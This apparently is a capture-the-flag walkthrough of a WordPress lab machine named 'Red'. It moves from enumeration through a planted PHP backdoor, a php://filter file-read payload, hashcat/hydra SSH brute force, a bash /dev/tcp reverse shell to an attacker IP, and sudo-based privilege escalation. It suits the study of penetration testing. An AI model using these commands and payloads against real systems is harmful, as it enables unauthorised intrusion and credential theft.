# Red1
**IP: 10.0.4.7**
<br>
First of all, I did an `nmap` scan and found that there were two open ports:<br>
> 80 _apache_ <br>
> 22 _ssh_

The site looks pretty simple. But I found some things in `robots.txt`<br>

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://redrocks.win/wp-sitemap.xml
```
I went to the sitemap and found that there was a user named:
administrator

Checked it on the admin-login page and looks like it works.
<br>
Going to the site we know that there is a backdoor. The hacker said so.
<br>
Let's look for backdoors. We have a good wordlist with backdoor names in seclists.<br>
`gobuster dir -u http://10.0.4.7/ -w CommonBackdoors-PHP.fuzz.txt`<br>
Looks like we found one:<br>
```
/NetworkFileManagerPHP.php (Status: 500) [Size: 0]
```
There is nothing if we go there. Therefore, we can try to put different requests like:<br>
`/NetworkFileManagerPHP.php?search=qwe`<br>
We can use `wfuzz` to do it.<br>
```
wfuzz -c -u "http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test" -w /usr/share/wfuzz/wordlist/general/big.txt --hh 00
```
We will find that the word `key` works.<br>
Try `http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd` and you will get a good result.

We know that this is a WordPress site. Also, we know that WordPress sites have wp-config.php file where there is a lot of interesting information. If we try to access it we won't see it since our browser automatically translates php code. However, we can find a PHP base64 filter on PlayloadsAllTheThings. https://github.com/swisskyrepo/PayloadsAllTheThings 
Here is an example:<br>
```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
Modify it for ourselves:<br>
```
http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=wp-config.php
```
It will give us a base64 string which we can decode and get the original wp-config.php code.<br>
Here is an interesting piece of code:<br>
```
...
/** MySQL database username */
define( 'DB_USER', 'john' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );
...
```
We know that there is an open _ssh_ port. If we try to use these credentials to _ssh_ it does not work.<br>
Also, we know that there is a backdoor file. Let's download it and see what it looks like.<br>
`http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php`<br>
Got a piece of code with another base64 line that says:<br>
`That password alone won't help you! Hashcat says rules are rules`<br>
And this is kind of a hint.<br>
We know that `hashcat` is a tool for password brute-forcing. We can see the work "rules" in the text which brings an assumption that we need to use a rule. _That is where we need to get acquainted with password-cracking rules._ Also, we can make an assumption that the rule is best64 since our hint was encoded in base64.<br>
We are going to take the password that we found in `wp-config.php`, put it in fule `pwd.txt`, and generate a custom wordlist with `hashcat` and a rule called `best64`.<br>
Our command will look like this:<br>
```
hashcat pwd.txt -r /usr/share/hashcat/rules/best64.rule --stdout > custom_wordlist.txt
```
Now, we have got our custom wordlist. Let's try to brute-force into `ssh`.<br>
```hydra -l john -P custom_wordlist.txt ssh://10.0.4.7```
> [22][ssh] host: 10.0.4.7   login: john   password: R3v_m4lwh3r3_k1nG!!02<br>
Looks like it worked.<br>

When we try to use `cat` command it runs `vi`, but when we use `vi` it runs `cat`.<br>
We can see that there are three users:<br>
> ippsec<br>
> john <br>
> oxdf <br>

After a couple of minutes using the `ssh shell` the connection was closed. The attacker made a script that kicked us out. The same password does not work, but we can brute force it again.<br>

### Upgrading our shell so we do not get kicked out.
1. Start a nc listener. `nc -lvnp 4444`
2. Run a simple reverse-shell on the victim machine. `bash -i >& /dev/tcp/10.0.4.4/4444 0>&1`
3. `python3 -c 'import pty;pty.spawn("/bin/bash")'` in our new reverse-shell.
4. *ctrl-z*
5. `stty raw -echo; fg`
9. `export TERM=xterm`
So now we have our new shell. Let's look at how we can escalate our privileges.<br>
The simplest way is to run `sudo -l` <br> 
```
User john may run the following commands on red:
    (ippsec) NOPASSWD: /usr/bin/time
```
This is what we got.
Go to https://gtfobins.github.io/gtfobins and find what we can do with /usr/bin/time.<br>
`sudo /usr/bin/time /bin/sh`<br>
However, by default sudo will try to run a tool with the privileges of the root user, but we have only privileges of ippsec, so we need to specify our user, so our command will look like:<br>
`sudo -u ippsec /usr/bin/time /bin/sh`<br>
_It is better to escalate our privileges to *ippsec* before we upgrade our shell_<br>
Let's look can we escalate our privileges to root.<br>
I used the next command to find all the folders where I have permission to write.<br>
`find / -writable -type d 2>/dev/null`<br>
It gave a couple of them, but the interesting one for me was:<br>
> /var/www/wordpress/.git 

If we go there, there are two files owned by root.<br>
I assume that the root user runs the _rev_ file occasionally. But let's look at the processes to make sure.<br>
I am going to use pspy64s to look at the processes. https://github.com/wildkindcc/Exploitation/blob/master/00.PostExp_Linux/pspy/pspy64s.
I downloaded it to my machine, started the Python HTTP server, and downloaded it to the victim's machine.<br>
For some reason, it says that there is no storage left and I cannot download anything to the machine. However, the only thing that I had to do was replace the rev script with my own which I had permission to do. My own script would be a simple reverse shell coded in C. After root would run the rev script again I would get my root reverse-shell.








